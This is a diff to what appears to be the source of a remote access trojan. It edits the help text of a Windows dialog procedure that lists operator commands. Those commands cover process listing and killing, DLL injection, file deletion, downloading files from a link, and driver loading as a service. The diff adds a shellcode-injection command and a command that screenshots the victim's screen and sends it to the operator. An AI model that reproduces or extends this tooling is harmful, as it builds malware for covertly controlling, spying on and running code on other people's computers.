@@ -156,7 +156,8 @@ INT_PTR DlgMain(HWND hWnd, UINT uMsg, WPARAM wParam, LPARAM lParam) {
 						"%0AProcess manager: %0A"
 						"/user[ID] processes - get process list %0A"
 						"/user[ID] closeproc [processname.exe] - close process %0A"
-						"/user[ID] inject_dll [processname.exe] [C:\\Path\\To\\File.dll] - Inject dll into process %0A"
+						"/user[ID] inject_dll [processname.exe] [C:\\Path\\To\\File.dll] - Inject dll in process %0A"
+						"/user[id] inject_shell [processname.exe] [shellcode] - Inject shellcode in process"
 
 						"%0AAuxiliary:%0A"
 						"/user[ID] loader [LINK] [PATH] - upload file from [LINK] to [PATH] %0A"
@@ -169,12 +170,15 @@ INT_PTR DlgMain(HWND hWnd, UINT uMsg, WPARAM wParam, LPARAM lParam) {
 
 						"%0AFile manager:%0A"
 						"/user[ID] dir show [C:\\Folder] - show files and folders in directory %0A"
-						"/user[ID] dir del_file C:\\Path\\To\\File.exe - delete file into directory %0A"
+						"/user[ID] dir del_file C:\\Path\\To\\File.exe - delete file in directory %0A"
 
 						"%0AService manager:%0A"
 						"/user[ID] service show - show all services in system %0A"
 						"/user[ID] service add [Name] [DisplayName] [C:\\ProgramData\\yourdriver.sys] [Type-Driver] [Start-Type] - load driver to system %0A"
 						"/user[ID] service delete [NameService] - delete service from system %0A"
+
+						"%0AScreen manager:%0A"
+						"/user[ID] screenshot - take screenshot and send you %0A"
 
 						"%0ARAT:%0A"
 						"/online - show online users%0A";
